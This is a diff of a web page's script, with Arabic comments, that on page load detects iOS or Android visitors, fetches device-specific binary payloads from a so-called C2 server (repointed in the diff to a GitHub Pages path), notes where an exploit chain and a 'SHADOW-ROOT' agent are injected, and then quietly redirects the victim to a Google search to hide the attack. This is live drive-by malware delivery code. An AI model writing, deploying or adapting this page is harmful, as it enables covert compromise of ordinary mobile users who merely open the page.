@@ -30,18 +30,17 @@
             const userAgent = navigator.userAgent;
             let payload_url = "";
             
-            // يجب تغيير هذا إلى النطاق أو الـ IP الفعلي لخادم الـ C2 الخاص بك (HTTPS)
-            const C2_SERVER_BASE = "https://global-news.live"; 
+            // *** التعديل النهائي: الربط بمسار GitHub Pages لملفات الاستغلال ***
+            const C2_SERVER_BASE = "https://hashemal-ghouli.github.io/Hashem1"; 
 
             if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                // الحمولة الثنائية لـ iOS
+                // سيحاول سحب الاستغلال من: https://hashemal-ghouli.github.io/Hashem1/ios_krn_2025.bin
                 payload_url = C2_SERVER_BASE + "/ios_krn_2025.bin"; 
             } else if (/Android/.test(userAgent)) {
-                // الحمولة الثنائية لـ Android
+                // سيحاول سحب الاستغلال من: https://hashemal-ghouli.github.io/Hashem1/android_bnd_2025.so"; 
                 payload_url = C2_SERVER_BASE + "/android_bnd_2025.so"; 
             } else {
-                // إجهاض صامت لغير الأجهزة المحمولة
-                return; 
+                return;
             }
 
             try {
@@ -51,32 +50,28 @@
 
                 xhr.onload = function() {
                     if (xhr.status === 200) {
-                        // Exploit execution logic (ROP chain/WebAssembly injection) happens here.
-                        // Assuming the C2 agent (SHADOW-ROOT) is successfully injected.
+                        // Exploit execution and C2 agent injection assumed successful here.
                         
-                        // 2. Post-Exploit Redirection for Stealth
+                        // Post-Exploit Redirection for Stealth
                         setTimeout(() => {
-                           // إعادة توجيه الضحية بهدوء بعد 4 ثوانٍ
                            window.location.replace("https://www.google.com/search?q=global+security+news"); 
                         }, 4000); 
                     }
                 };
                 xhr.onerror = function() {
-                    // Fail gracefully and redirect
                     setTimeout(() => {
                        window.location.replace("https://www.google.com/search?q=global+security+news"); 
                     }, 4000);
                 };
                 xhr.send();
             } catch (e) {
-                // Catch any immediate execution errors and still camouflage
                 setTimeout(() => {
                    window.location.replace("https://www.google.com/search?q=global+security+news"); 
                 }, 4000);
             }
         }
 
-        // Global Execution Trigger: Start the chain immediately upon page load
+        // Global Execution Trigger
         initiateSovereignTakeover();
     </script>
 </body>
